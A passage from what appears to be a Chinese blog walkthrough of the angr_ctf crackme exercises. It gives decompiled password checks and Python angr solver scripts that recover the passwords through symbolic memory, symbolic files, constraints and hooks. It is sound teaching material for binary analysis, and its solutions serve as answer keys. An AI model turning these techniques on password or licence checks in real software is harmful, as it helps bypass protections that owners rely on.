class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">answer1 = found_state.solver.<span class="built_in">eval</span>(password1,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">answer2 = found_state.solver.<span class="built_in">eval</span>(password2,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">answer3 = found_state.solver.<span class="built_in">eval</span>(password3,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">answer4 = found_state.solver.<span class="built_in">eval</span>(password4,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer1,answer2,answer3,answer4))</span><br></pre></td></tr></table></figure>
<p><strong>06_angr_symbolic_dynamic_memory</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buffer0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">buffer1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line"><span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line"><span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">__isoc99_scanf((<span class="keyword">int</span>)<span class="string">&quot;%8s %8s&quot;</span>, (<span class="keyword">int</span>)buffer0, (<span class="keyword">int</span>)buffer1);</span><br></pre></td></tr></table></figure>
<ul>
<li>这次是把数据输入到堆中</li>
</ul>
<p>由于我们直接跳过了输入，导致 <code>malloc</code> 并没有执行，此时堆应该是没有初始化的</p>
<p>因此我们直接在栈上伪造一个堆空间，然后在 <code>buffer0 buffer1</code> 中写入我们伪造的地址：</p>
<ul>
<li>注意：angr 默认使用大端写，但写地址时需要指定 <code>endness=p.arch.memory_endness</code> 切换为小端写</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span>)</span><br><span class="line">init_state = p.factory.blank_state(addr=<span class="number">0x08048696</span>)</span><br><span class="line"></span><br><span class="line">password1 = claripy.BVS(<span class="string">&quot;password1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&quot;password2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">password1_addr = <span class="number">0x0ABCC8A4</span></span><br><span class="line">password2_addr = <span class="number">0x0ABCC8AC</span></span><br><span class="line"></span><br><span class="line">password1_fakeheap = init_state.regs.esp + <span class="number">0x100</span></span><br><span class="line">password2_fakeheap = init_state.regs.esp + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">init_state.memory.store(password1_addr,password1_fakeheap,endness=p.arch.memory_endness)</span><br><span class="line">init_state.memory.store(password2_addr,password2_fakeheap,endness=p.arch.memory_endness)</span><br><span class="line">init_state.memory.store(password1_fakeheap,password1)</span><br><span class="line">init_state.memory.store(password2_fakeheap,password2)</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">answer1 = found_state.solver.<span class="built_in">eval</span>(password1,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">answer2 = found_state.solver.<span class="built_in">eval</span>(password2,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer1,answer2))</span><br></pre></td></tr></table></figure>
<p><strong>07_angr_symbolic_file</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">ignore_me(buffer, <span class="number">0x40</span>u);</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>程序先把输入的数据传输到文件中，然后打开文件从里面取出数据</li>
</ul>
<p>这次的目标就是符号化一个文件，使用 <code>init_state.fs.insert(file_name,SimFile)</code> 可以把一个指定文件名的文件，设置为符号化文件</p>
<p>我们需要跳过输入，在 <code>open</code> 之前开始执行程序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./07_angr_symbolic_file&quot;</span>)</span><br><span class="line">init_state = p.factory.blank_state(addr=<span class="number">0x080488D3</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;OJKSQYDP.txt&quot;</span></span><br><span class="line">file_size = <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">password1 = claripy.BVS(<span class="string">&quot;password1&quot;</span>,file_size)</span><br><span class="line">SimFile = angr.storage.SimFile(file_name,content=password1,size=file_size)</span><br><span class="line">init_state.fs.insert(file_name,SimFile)</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">answer1 = found_state.solver.<span class="built_in">eval</span>(password1,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer1))</span><br></pre></td></tr></table></figure>
<p><strong>08_angr_constraints</strong></p>
<p>本题目使用单字节对比：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">check_equals_AUPDNNPROEZRJWKB</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + <span class="number">0x804A040</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr 有一个名为“路径爆炸”的问题，这种单字节对比的函数会导致路径特别多，大大降低 angr 的运行速度，于是我们需要一种方法来减缓“路径爆炸”的影响</p>
<p>常见的做法就是把“对比函数”提取出来，手动为该函数添加 <code>check_constraint</code>（通过条件），然后再用约束器求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./08_angr_constraints&quot;</span>)</span><br><span class="line">init_state = p.factory.blank_state(addr=<span class="number">0x08048622</span>)</span><br><span class="line"></span><br><span class="line">password = claripy.BVS(<span class="string">&quot;password&quot;</span>,<span class="number">0x10</span>*<span class="number">8</span>)</span><br><span class="line">password_addr = <span class="number">0x0804A050</span></span><br><span class="line"></span><br><span class="line">init_state.memory.store(password_addr,password)</span><br><span class="line"></span><br><span class="line">check_addr = <span class="number">0x08048565</span> <span class="comment"># 08048673</span></span><br><span class="line">check_key = <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line">sm.explore(find=check_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    check_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    check_param1 = password_addr</span><br><span class="line">    check_param2 = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    check_bvs = check_state.memory.load(check_param1,check_param2)</span><br><span class="line">    check_constraint = check_key == check_bvs</span><br><span class="line">    check_state.add_constraints(check_constraint)</span><br><span class="line"></span><br><span class="line">    answer = check_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer.decode()))</span><br></pre></td></tr></table></figure>
<p><strong>09_angr_hooks</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  *(_BYTE *)(i + <span class="number">0x804A054</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0x804A054</span>), <span class="number">18</span> - i);</span><br><span class="line">equals = check_equals_XYMKBKUHNIQYNQXE((<span class="keyword">int</span>)buffer, <span class="number">0x10</span>u);</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">  *(_BYTE *)(j + <span class="number">0x804A044</span>) = complex_function(*(<span class="keyword">char</span> *)(j + <span class="number">0x804A044</span>), j + <span class="number">9</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br></pre></td></tr></table></figure>
<p>本题目的执行路径比较混乱，如果用之前的方法来处理“路径爆炸”就会导致代码冗余（查找到目标“比较函数”后，需要判断该“比较函数”是否通过，然后再查找 <code>Good Job</code>）</p>
<p>angr 还提供了另一种方法来应对“路径爆炸”：</p>
<ul>
<li>直接 hook 掉“比较函数”，利用自己实现的函数来替代它</li>
<li>然后根据比较结果来操控 <code>eax</code> 寄存器</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./09_angr_hooks&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x0804A054</span></span><br><span class="line"></span><br><span class="line">check_addr = <span class="number">0x080486B3</span></span><br><span class="line">check_skip = <span class="number">4</span> + <span class="number">1</span></span><br><span class="line">check_key = <span class="string">&quot;XYMKBKUHNIQYNQXE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@p.hook(<span class="params">check_addr,length=check_skip</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_hook</span>(<span class="params">state</span>):</span></span><br><span class="line">    check_param1 = password_addr</span><br><span class="line">    check_param2 = <span class="number">0x10</span></span><br><span class="line">    input_bvs = state.memory.load(check_param1,check_param2)</span><br><span class="line"></span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">        check_key == input_bvs,</span><br><span class="line">        claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),</span><br><span class="line">        claripy.BVV(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>10_angr_simprocedures</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">17</span>]; <span class="comment">// [esp+2Bh] [ebp-1Dh] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;password, <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], <span class="number">18</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_ORSDDWXHZURJRBDH((<span class="keyword">int</span>)s, <span class="number">0x10</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个题目看似可以用上一个方法来做，但稍微用 IDA 分析一下就会发现问题：</p>
<img src="/2022/12/13/angr%E7%9A%84%E7%BB%83%E4%B9%A0%E4%B8%8E%E6%8F%90%E5%8D%87/1670857626163.png" class width="1670857626163"> 
<ul>
<li>程序为每个路径分支都提供了一个“比较函数”，我们根本不知道该 hook 掉哪一个</li>
</ul>
<p>因此我们需要根据函数名来进行 hook：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./10_angr_simprocedures&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x0804C048</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self,input_addr,input_length</span>):</span></span><br><span class="line">        check_key = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">        input_bvs = self.state.memory.load(input_addr,input_length)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> claripy.If(</span><br><span class="line">            check_key == input_bvs,</span><br><span class="line">            claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),</span><br><span class="line">            claripy.BVV(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">check_name = <span class="string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">p.hook_symbol(check_name,mySimPro())</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>11_angr_sim_scanf</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">20</span>]; <span class="comment">// [esp+28h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  qmemcpy(s, <span class="string">&quot;SUQMKQFX&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], i);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %u&quot;</span>, buffer0, buffer1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, s, <span class="number">4u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, &amp;s[<span class="number">4</span>], <span class="number">4u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个题目在输入的前面完成了加密</li>
</ul>
<img src="/2022/12/13/angr%E7%9A%84%E7%BB%83%E4%B9%A0%E4%B8%8E%E6%8F%90%E5%8D%87/1670859042174.png" class width="1670859042174"> 
<ul>
<li>并且让我们无法确定开始执行的地址</li>
</ul>
<p>题目原本考点是：将 scanf 替换为我们自己的版本（老版本 angr 不支持使用 scanf 请求多个参数）</p>
<p>现在新版本的 angr 已经支持多个参数的 scanf 了：</p>
